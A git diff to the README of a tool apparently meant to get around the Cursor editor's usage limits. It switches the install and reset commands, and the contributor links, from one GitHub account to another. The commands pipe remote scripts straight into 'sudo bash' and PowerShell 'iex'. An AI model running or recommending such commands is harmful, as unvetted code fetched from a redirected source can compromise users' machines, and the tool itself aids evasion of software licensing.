@@ -74,13 +74,13 @@ Always clean your browser's cache and cookies. If possible, use a VPN to create 
 **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://raw.githubusercontent.com/abhiiinavpc369/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
 ```
 
 **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/abhiiinavpc369/cursor-free-vip/main/scripts/install.ps1 | iex
 ```
 
 </details>
@@ -91,13 +91,13 @@ irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/inst
 **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/abhiiinavpc369/cursor-free-vip/main/scripts/reset.sh | sudo bash
 ```
 
 **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.ps1 | iex
+irm https://raw.githubusercontent.com/abhiiinavpc369/cursor-free-vip/main/scripts/reset.ps1 | iex
 ```
 
 </details>
@@ -189,8 +189,8 @@ show_account_info = True
 歡迎提交 Issue 和 Pull Request！
 
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://github.com/abhiiinavpc369/cursor-free-vip/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=abhiiinavpc369/cursor-free-vip&preview=true&max=&columns=" />
 </a>
 <br /><br />
 
@@ -220,7 +220,7 @@ by the user.
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=abhiiinavpc369/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
 
 </div>
 
